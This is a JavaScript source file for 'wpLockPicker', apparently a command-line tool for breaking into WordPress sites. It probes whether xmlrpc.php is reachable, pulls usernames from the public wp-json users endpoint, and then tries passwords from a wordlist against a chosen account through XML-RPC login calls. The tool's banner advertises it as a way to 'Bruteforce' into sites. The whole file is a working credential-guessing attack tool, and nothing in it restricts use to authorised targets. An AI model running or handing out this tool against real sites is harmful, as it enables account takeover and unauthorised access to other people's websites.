import axios from 'axios'
import readline from 'readline'
import fs from 'fs'
import args from 'minimist'
import { setTimeout } from 'timers/promises';
import { COLORS } from "./constants.js"

/////// GET ARGUMENTS ///////

const arg = args(process.argv.slice(2))

/////// FORMAT URL ///////
const formatUrl = async (url) => {
    return url.replace(/^https?:\/\//, '');
}

/////// GET USER INPUT ///////
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

/////// TEST IF XMLRPC ENABLED SITE ///////
const testXMLRPC = async (baseUrl) => {
    console.log(COLORS.yellow, '[!] Checking if targer is vulnerable!')
    try {
        let resp = await axios.get(`${baseUrl}/xmlrpc.php`)
    } catch (e) {
        try {
            if (e.response.status === 405) {
                console.log(COLORS.green, `[+] XMLRPC Enabled: ${baseUrl} is vulnerable to a BruteForce attack!`)
                return true
            } else {
                console.log(COLORS.red, `[-] XMLRPC seems to be disabled: ${baseUrl} is not vulnerable to a BruteForce attack at the moment!`)
                return false
            }
        } catch (e) {
            console.log(COLORS.red, `[!] ERROR:${e}. Make sure your webiste is live.`)
        }
        
    }
}

/////// TEST IF WP-JSON ENABLED SITE ///////
const getUsers = async (baseUrl) => {
    console.log(COLORS.yellow, '[!] Attempting to identify users!')
    try {
        let resp = await axios.get(`${baseUrl}/wp-json/wp/v2/users`)
        const contentType = resp.headers['content-type']
        if ( contentType.includes('json') ) {
            try {
                let users = []
                resp.data.forEach(e => {
                    users.push(e.slug)
                });
                return users
            } catch (e) {
                console.log(COLORS.red, `[!] There was an error processing your request!`)
            }
        }
    } catch (e) {
        console.log(COLORS.red, `[-] No users identified`)
    }
    return null 
}

/////// ATTEMPT LOGIN ///////
const wpLogin = async (baseUrl, user, pass) => {
    const config = {
        headers: {
            'Content-Type': 'text/xml'
        }
    }
    const data = `<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>${user}</string></value></param><param><value><string>${pass}</string></value></param></params></methodCall>`
    try {
        let resp = await axios.post(`${baseUrl}/xmlrpc.php`, data, config)
        if ( resp.data.includes('isAdmin') ) {
            console.log(COLORS.green, `[+] Password ${pass} is working!`)
            return true
        }
    } catch (e) {
        console.log(COLORS.yellow, `[!] Error testing ${pass}: ${e.code}`)
    }
    console.log(COLORS.red, `[-] Password ${pass} not working!`)
    return false
}

/////// MAIN ///////
console.clear()
console.log(COLORS.cyan, `
█     █░ ██▓███   ██▓     ▒█████   ▄████▄   ██ ▄█▀ ██▓███   ██▓ ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓█░ █ ░█░▓██░  ██▒▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓██░  ██▒▓██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▓██░ ██▓▒▒██░    ▒██░  ██▒▒▓█    ▄ ▓███▄░ ▓██░ ██▓▒▒██▒▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒██▄█▓▒ ▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ▒██▄█▓▒ ▒░██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ▒██▒ ░  ░░██████▒░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄▒██▒ ░  ░░██░▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒▒▓▒░ ░  ░░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░  ░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░░▒ ░      ▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░   ░  ░░         ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░ ░░        ▒ ░░        ░ ░░ ░    ░     ░░   ░ 
    ░                 ░  ░    ░ ░  ░ ░      ░  ░             ░  ░ ░      ░  ░      ░  ░   ░     
                                   ░                            ░                               
                        
                        wpLockPicker: Bruteforce youur way into it.
                                    by mihnaemanolache
                           https://github.com/mihneamanolache/
                                   `)
const BASE_URL = arg['http'] ? `http://${await formatUrl(arg['url'])}` : `https://${await formatUrl(arg['url'])}` 
let check = await testXMLRPC(BASE_URL)
if ( check ) {
    let users = await getUsers(BASE_URL)
    if ( users === null ) { 
        rl.question('[!] Continue to manually specify the username? [y/n]: ', (ans) => {
            if ( ans.toLowerCase() === 'y' || ans.toLowerCase() === 'yes' ) {
                rl.question('[i] Username: ', (ans) => {
                    console.log(COLORS.yellow, `[!] Attempting bruteforce on user '${ans}'!`)
                    let rd = readline.createInterface({
                        input: fs.createReadStream(arg['pass'] ? arg['pass'] : './pass.txt')
                    })
                    rd.on('line', async (pass) => {
                        let tryOne = await wpLogin(BASE_URL, ans, pass)
                        if ( tryOne ) {
                            rl.close()
                            process.exit()
                        }
                        await setTimeout(3000)
                    })
                    rl.close()
                })
            } else {
                process.exit()
            }
        })
    } else if ( users.length == 1 ) {
        console.log(COLORS.green, `[+] Single user found: ${users}`)
        rl.question(`[?] Would you like to attempt a bruteforce attack on '${users}'? [y/n]: `, async (ans) => {
            if ( ans.toLowerCase() === 'y' || ans.toLowerCase === 'yes' ) {
                let rd = readline.createInterface({
                    input: fs.createReadStream(arg['pass'] ? arg['pass'] : './pass.txt')
                })
                rd.on('line', async (pass) => {
                    let tryOne = await wpLogin(BASE_URL, users, pass)
                    if ( tryOne ) {
                        process.exit()
                    }
                    await setTimeout(3000)
                })
                rl.close()
            } else {
                rl.close()
            }
        })
    } else {
        console.log(COLORS.green, `[+] Multiple users found:`)
        users.forEach(user => {
            console.log(COLORS.green, `     [•] ${user}`)
        });
        rl.question('[i] Which user are you targerting: ', async (ans) => {
            console.log(COLORS.yellow, `[!] Attempting bruteforce on user '${ans}'!`)
            let rd = readline.createInterface({
                input: fs.createReadStream(arg['pass'] ? arg['pass'] : './pass.txt')
            })
            rd.on('line', async (pass) => {
                let tryOne = await wpLogin(BASE_URL, ans, pass)
                if ( tryOne ) {
                    rl.close()
                    process.exit()
                }
                await setTimeout(3000)
            })
            rl.close()
        })
    }
} else {
    process.exit()
}